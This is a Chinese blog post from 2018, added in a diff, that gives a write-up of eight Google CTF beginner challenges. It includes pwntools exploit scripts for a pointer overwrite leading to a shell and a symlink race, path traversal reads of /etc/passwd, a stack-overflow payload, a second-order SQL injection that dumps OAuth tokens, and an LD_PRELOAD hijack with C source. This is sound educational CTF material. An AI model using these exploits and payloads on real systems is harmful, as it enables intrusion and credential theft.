@@ -1,0 +1,425 @@
+
+ <!DOCTYPE HTML>
+<html >
+<head>
+  <meta charset="UTF-8">
+  
+    <title>Google CTF Beginner Part2 | 风之栖息地</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="hurricane618">
+    
+    <meta name="description" content="Holey Beep(PWN)Holey Beep是CVE-2018-0492，详细的漏洞细节 https://sigint.sh/#/holeybeep 。一开始以为要用这个的exp，结果一看给的二进制文件，似乎不太对……我们需要得到/secret_cake_recipe的内容，然而权限不够，所以">
+    
+    
+    
+    
+    <link rel="alternate" href="/atom.xml" title="风之栖息地" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/hurricane_favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/hurricane.png">
+    <link rel="apple-touch-icon-precomposed" href="/img/hurricane.png">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      <div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/hurricane.svg" alt="风之栖息地" title="风之栖息地"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="风之栖息地">风之栖息地</a></h1>
+				<h2 class="blog-motto">habitat of wind</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:hurricane618.me">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/08/15/google-ctf-beginner-part2/" title="Google CTF Beginner Part2" itemprop="url">Google CTF Beginner Part2</a>
+  </h1>
+  <p class="article-author">By
+    
+      <a href="https://hurricane618.me" title="hurricane618">hurricane618</a>
+    </p>
+  <p class="article-time">
+    <time datetime="2018-08-14T16:47:21.000Z" itemprop="datePublished">2018-08-15</time>
+    Updated:<time datetime="2018-08-14T16:47:21.273Z" itemprop="dateModified">2018-08-15</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Holey-Beep-PWN"><span class="toc-number">1.</span> <span class="toc-text">Holey Beep(PWN)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Admin-UI-PWN-RE"><span class="toc-number">2.</span> <span class="toc-text">Admin UI(PWN+RE)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Admin-UI-2-PWN-RE"><span class="toc-number">3.</span> <span class="toc-text">Admin UI 2(PWN+RE)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Admin-UI-3-PWN-RE"><span class="toc-number">4.</span> <span class="toc-text">Admin UI 3(PWN+RE)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Firmware-RE"><span class="toc-number">5.</span> <span class="toc-text">Firmware(RE)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gatekeepker-RE"><span class="toc-number">6.</span> <span class="toc-text">Gatekeepker(RE)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Media-DB-MISC"><span class="toc-number">7.</span> <span class="toc-text">Media-DB(MISC)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Filter-env-PWN"><span class="toc-number">8.</span> <span class="toc-text">Filter env(PWN)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">9.</span> <span class="toc-text">总结</span></a></li></ol>
+		</div>
+		
+		<h2 id="Holey-Beep-PWN"><a href="#Holey-Beep-PWN" class="headerlink" title="Holey Beep(PWN)"></a>Holey Beep(PWN)</h2><p>Holey Beep是CVE-2018-0492，详细的漏洞细节 <a href="https://sigint.sh/#/holeybeep" target="_blank" rel="noopener">https://sigint.sh/#/holeybeep</a> 。一开始以为要用这个的exp，结果一看给的二进制文件，似乎不太对……我们需要得到<code>/secret_cake_recipe</code>的内容，然而权限不够，所以这里应该是拿来越权的。</p>
+<img src="/2018/08/15/google-ctf-beginner-part2/1.png">
+<p>我们看到第一个if是一个通过信号触发的条件，第二个if知道了程序需要参数，然后会open一个写死的路径，之后将输入的参数代入<code>ioctl(device,0x4B2F,参数)</code>，出现问题就会打印报错信息，然后关闭打开的文件。循环上面的操作把所有的参数都跑一遍。</p>
+<p>信号触发的if会执行额外的一段函数。</p>
+<img src="/2018/08/15/google-ctf-beginner-part2/2.png">
+<p>这里if成功的话就会打印错误信息，读取open的文件输出出来。这里应该是重点，有读写操作。</p>
+<p>如果我们读的文件是<code>/secret_cake_recipe</code>那么只要触发signal以及满足if判断就可以拿到数据。这里可以用<code>ln -s</code>软链接生成<code>dev/console</code>，然后我们执行该程序同时发送SIGTERM信号就可以越权拿到数据。这里需要注意的是我们要让程序延长运行时间才行，如果运行时间不足，还没接收到信号就结束了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack,pack</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"fridge-todo-list.ctfcompetition.com"</span>, <span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"whz\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"2\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"read?"</span>)</span><br><span class="line">r.send(<span class="string">"-6\n"</span>)</span><br><span class="line">res = r.readuntil(<span class="string">"Hi whz,"</span>).splitlines()[<span class="number">0</span>]</span><br><span class="line">write_addr = res.split(<span class="string">':'</span>, <span class="number">1</span>)[<span class="number">1</span>][<span class="number">1</span>:].ljust(<span class="number">8</span>,chr(<span class="number">0</span>))</span><br><span class="line">write_addr = unpack(<span class="string">"&lt;Q"</span>, write_addr)[<span class="number">0</span>]</span><br><span class="line">base_addr = write_addr - <span class="number">0x910</span></span><br><span class="line">system_addr = base_addr + <span class="number">0x940</span></span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"3\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"entry?"</span>)</span><br><span class="line">r.send(<span class="string">"-4\n"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">8</span> + pack(<span class="string">"&lt;Q"</span>, system_addr) + <span class="string">"\n"</span>)</span><br><span class="line">r.send(<span class="string">"/bin/sh\n"</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.send(<span class="string">"cd /tmp\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo '#!/bin/bash' &gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo 'mkdir dev' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo 'ln -s /secret_cake_recipe dev/console' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo '/home/user/holey_beep &#123;1..4096&#125; &amp;' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo 'pkill holey_beep -SIGTERM' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"chmod +x pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"./pwn.sh\n"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>这里需要多试几次来触发条件竞争，最后拿到flag</p>
+<img src="/2018/08/15/google-ctf-beginner-part2/3.png">
+<h2 id="Admin-UI-PWN-RE"><a href="#Admin-UI-PWN-RE" class="headerlink" title="Admin UI(PWN+RE)"></a>Admin UI(PWN+RE)</h2><p>看了题目的介绍，再加上这个补丁信息，知道了有路径穿越漏洞。而一看提供的功能中只有第二个选项有读的操作，然后试了一下<code>../../../../../../../../../../../etc/passwd</code>，果然读到了passwd文件。</p>
+<img src="/2018/08/15/google-ctf-beginner-part2/4.png">
+<p>那么剩下来的就只是寻找要读的文件了。</p>
+<p>通过使用<code>../../../../../../proc/self/cmdline</code>得到运行程序的命令行参数。</p>
+<img src="/2018/08/15/google-ctf-beginner-part2/5.png">
+<p>得到运行程序的命名，需要猜路径，猜到了<code>../main</code>，把读取到的二进制文件保存下来 <code>printf &quot;2\n../main\n3\n&quot; | nc mngmnt-iface.ctfcompetition.com 1337 &gt; output.bin</code></p>
+<p>再通过16进制编辑器把多余的目录删掉，这样就得到了服务器上的二进制文件。</p>
+<p>浏览代码，在验证登录的过程中打开了<code>flag</code>文件，然后比较输入。这样目标就很明确了，直接读<code>../flag</code>就可以拿到flag。</p>
+<img src="/2018/08/15/google-ctf-beginner-part2/6.png">
+<h2 id="Admin-UI-2-PWN-RE"><a href="#Admin-UI-2-PWN-RE" class="headerlink" title="Admin UI 2(PWN+RE)"></a>Admin UI 2(PWN+RE)</h2><p>继续上一题的程序分析第二个密码</p>
+<img src="/2018/08/15/google-ctf-beginner-part2/7.png">
+<p>可以看到这里对我们的输入异或之后会得到flag数组中的赋值，我们可以得到flag数组的值，只要再次异或回去即可得到密码。</p>
+<img src="/2018/08/15/google-ctf-beginner-part2/8.png">
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">e_string = [<span class="number">0x84</span>, <span class="number">0x93</span>, <span class="number">0x81</span>, <span class="number">0xbc</span>, <span class="number">0x93</span>, <span class="number">0xb0</span>, <span class="number">0xa8</span>, <span class="number">0x98</span>, <span class="number">0x97</span>, <span class="number">0xa6</span>, <span class="number">0xb4</span>, <span class="number">0x94</span>, <span class="number">0xb0</span>, <span class="number">0xa8</span>, <span class="number">0xb5</span>, <span class="number">0x83</span>, <span class="number">0xbd</span>, <span class="number">0x98</span>, <span class="number">0x85</span>, <span class="number">0xa2</span>, <span class="number">0xb3</span>, <span class="number">0xb3</span>, <span class="number">0xa2</span>, <span class="number">0xb5</span>, <span class="number">0x98</span>, <span class="number">0xb3</span>, <span class="number">0xaf</span>, <span class="number">0xf3</span>, <span class="number">0xa9</span>, <span class="number">0x98</span>, <span class="number">0xf6</span>, <span class="number">0x98</span>, <span class="number">0xac</span>, <span class="number">0xf8</span>, <span class="number">0xba</span>]</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> e_string:</span><br><span class="line">    s ^= <span class="number">0xc7</span></span><br><span class="line">    flag += chr(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+<img src="/2018/08/15/google-ctf-beginner-part2/9.png">
+<h2 id="Admin-UI-3-PWN-RE"><a href="#Admin-UI-3-PWN-RE" class="headerlink" title="Admin UI 3(PWN+RE)"></a>Admin UI 3(PWN+RE)</h2><p>这里有两个漏洞点，第一个是格式化字符串漏洞，第二个是栈溢出漏洞，我这里是使用的是栈溢出漏洞。</p>
+<img src="/2018/08/15/google-ctf-beginner-part2/10.png">
+<p>看到缓冲区的位置离bp寄存器有0x30的距离。</p>
+<img src="/2018/08/15/google-ctf-beginner-part2/11.png">
+<p>又因为是64位程序，所以再加上8个字节的RBP，最后加上我们的geishell函数地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'mngmnt-iface.ctfcompetition.com'</span>,<span class="number">1337</span>)</span><br><span class="line">shell_add = <span class="number">0x41414349</span></span><br><span class="line"></span><br><span class="line">r.send(<span class="string">"1\n\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"password"</span>)</span><br><span class="line">r.send(<span class="string">"CTF&#123;I_luv_buggy_sOFtware&#125;\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"password"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">35</span>+<span class="string">"\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Authenticated"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">0x38</span> + p64(shell_add))</span><br><span class="line">r.send(<span class="string">"quit\n"</span>)</span><br><span class="line">r.send(<span class="string">"quit\n"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<img src="/2018/08/15/google-ctf-beginner-part2/12.png">
+<h2 id="Firmware-RE"><a href="#Firmware-RE" class="headerlink" title="Firmware(RE)"></a>Firmware(RE)</h2><p>虽然标签写的是RE但是……，做完的感觉就是一个MISC。</p>
+<p>首先拿到一个zip文件，解压之后是一个gz压缩包，再次解压得到ext4的文件，搜索之后得知是一个Linux的文件系统。直接挂载之，<code>mount -t ext4 challenge2.ext4 /mnt</code>，需要root权限。挂载之后寻找线索，找了一圈在根目录下有个隐藏压缩文件<code>.mediapc_backdoor_password.gz</code>，解压cat一下，得到flag。</p>
+<img src="/2018/08/15/google-ctf-beginner-part2/13.png">
+<h2 id="Gatekeepker-RE"><a href="#Gatekeepker-RE" class="headerlink" title="Gatekeepker(RE)"></a>Gatekeepker(RE)</h2><p>一个简单的字符串逆序程序，有两个参数，第二个参数会被逆序，然后和<code>zLl1ks_d4m_T0g_I</code>比较，这样就简单了，直接逆转回来就好。</p>
+<img src="/2018/08/15/google-ctf-beginner-part2/14.png">
+<img src="/2018/08/15/google-ctf-beginner-part2/15.png">
+<h2 id="Media-DB-MISC"><a href="#Media-DB-MISC" class="headerlink" title="Media-DB(MISC)"></a>Media-DB(MISC)</h2><p>给了一个python文件，大概的功能是能记录歌手和歌曲的一个简易控制台，要我们获取oauth_token。在输入点中过滤了单引号，而且输入点只有一个没有办法使用\来转义单引号逃逸字符串，所以这里只能寻找其他思路来突破。</p>
+<img src="/2018/08/15/google-ctf-beginner-part2/16.png">
+<p>观察到这里有一个从数据库随机读歌手的操作，再加上之前的操作单引号，双引号过滤不一致。</p>
+<img src="/2018/08/15/google-ctf-beginner-part2/17.png">
+<p>那么这里的不一致性就会造成二阶注入，我们可以在过滤双引号的输入点中注入带有单引号的数据，然后在随机读歌手的时候单引号会被代入SQL语句中造成SQL注入。</p>
+<p><code>xxxx&#39; union select 1,oauth_token from oauth_tokens --</code></p>
+<p>这里顺带一提不能使用#注释符，因为#符号在python中也是注释符会破坏语法。</p>
+<img src="/2018/08/15/google-ctf-beginner-part2/18.png">
+<h2 id="Filter-env-PWN"><a href="#Filter-env-PWN" class="headerlink" title="Filter env(PWN)"></a>Filter env(PWN)</h2><p>给了C的源代码，主要操作就是设置环境变量，代码中过滤了一些常见的环境变量。</p>
+<img src="/2018/08/15/google-ctf-beginner-part2/19.png">
+<p>问题出在这个过滤只执行一次，所以我们重复设置环境变量就可以了。这里是利用LD_PRELOAD劫持函数，执行我们编译的函数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __libc_start_main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *arg[] = &#123;<span class="string">"/bin/cat"</span>, <span class="string">"/home/adminimum/flag"</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    execve(arg[<span class="number">0</span>], arg, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>gcc load.c -o load -shared -fPIC</code>生成动态链接文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">load_file = base64.b64encode(open(<span class="string">"load"</span>, <span class="string">"rb"</span>).read())</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"env.ctfcompetition.com"</span>, <span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"cd /tmp\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo '"</span> + load_file + <span class="string">"' &gt; load.txt\n"</span>)</span><br><span class="line">r.send(<span class="string">"base64 -d load.txt &gt; load.so\n"</span>)</span><br><span class="line">r.send(<span class="string">"/home/adminimum/filterenv\n"</span>)</span><br><span class="line">r.send(<span class="string">"LD_PRELOAD=/tmp\n"</span>)</span><br><span class="line">r.send(<span class="string">"LD_PRELOAD=/tmp/load.so\n"</span>)</span><br><span class="line">r.send(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<img src="/2018/08/15/google-ctf-beginner-part2/20.png">
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学到了一些PWN方面的知识还是不错的，丰富知识面。就是想吐槽这个题目的标签，很多都是挂羊头卖狗肉。</p>
+<img src="/2018/08/15/google-ctf-beginner-part2/21.png">
+  
+	</div>
+		<footer class="article-footer clearfix">
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/CTF/">CTF</a>
+  </div>
+
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/技术/">技术</a>
+</div>
+
+
+
+<div class="article-share" id="share">
+
+  <div data-url="https://hurricane618.me/2018/08/15/google-ctf-beginner-part2/" data-title="Google CTF Beginner Part2 | 风之栖息地" data-tsina="" class="share clearfix">
+  </div>
+
+</div>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2018/08/01/dianfengjikeCTF-web/"  title="巅峰极客CTF 部分Web复现">
+ <strong>NEXT:</strong><br/> 
+ <span>巅峰极客CTF 部分Web复现
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = ;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = ; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://hurricane618.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Holey-Beep-PWN"><span class="toc-number">1.</span> <span class="toc-text">Holey Beep(PWN)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Admin-UI-PWN-RE"><span class="toc-number">2.</span> <span class="toc-text">Admin UI(PWN+RE)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Admin-UI-2-PWN-RE"><span class="toc-number">3.</span> <span class="toc-text">Admin UI 2(PWN+RE)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Admin-UI-3-PWN-RE"><span class="toc-number">4.</span> <span class="toc-text">Admin UI 3(PWN+RE)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Firmware-RE"><span class="toc-number">5.</span> <span class="toc-text">Firmware(RE)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gatekeepker-RE"><span class="toc-number">6.</span> <span class="toc-text">Gatekeepker(RE)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Media-DB-MISC"><span class="toc-number">7.</span> <span class="toc-text">Media-DB(MISC)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Filter-env-PWN"><span class="toc-number">8.</span> <span class="toc-text">Filter env(PWN)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">9.</span> <span class="toc-text">总结</span></a></li></ol>
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+			<li><a href="/categories/技术/" title="技术">技术<sup>6</sup></a></li>
+		
+			<li><a href="/categories/杂谈/" title="杂谈">杂谈<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			<li><a href="/tags/CSP/" title="CSP">CSP<sup>1</sup></a></li>
+		
+			<li><a href="/tags/CTF/" title="CTF">CTF<sup>4</sup></a></li>
+		
+			<li><a href="/tags/PHP/" title="PHP">PHP<sup>1</sup></a></li>
+		
+			<li><a href="/tags/XSS/" title="XSS">XSS<sup>1</sup></a></li>
+		
+			<li><a href="/tags/代码审计/" title="代码审计">代码审计<sup>1</sup></a></li>
+		
+			<li><a href="/tags/闲聊/" title="闲聊">闲聊<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  
+  <div class="archiveslist">
+    <p class="asidetitle"><a href="/archives">Archives</a></p>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a><span class="archive-list-count">2</span></li></ul>
+  </div>
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> 愿风指引你的道路 <br/>
+			May the wind guide you</p>
+	</section>
+	 
+	<div class="social-font clearfix">
+		
+		
+		
+		<a href="https://github.com/hurricane618" target="_blank" title="github"></a>
+		
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="Pacman">Pacman</a> © 2018 
+		
+		<a href="https://hurricane618.me" target="_blank" title="hurricane618">hurricane618</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="#textlogo" class="article-back-to-top" title="Top"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});     
+</script>
+
+
+
+
+
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
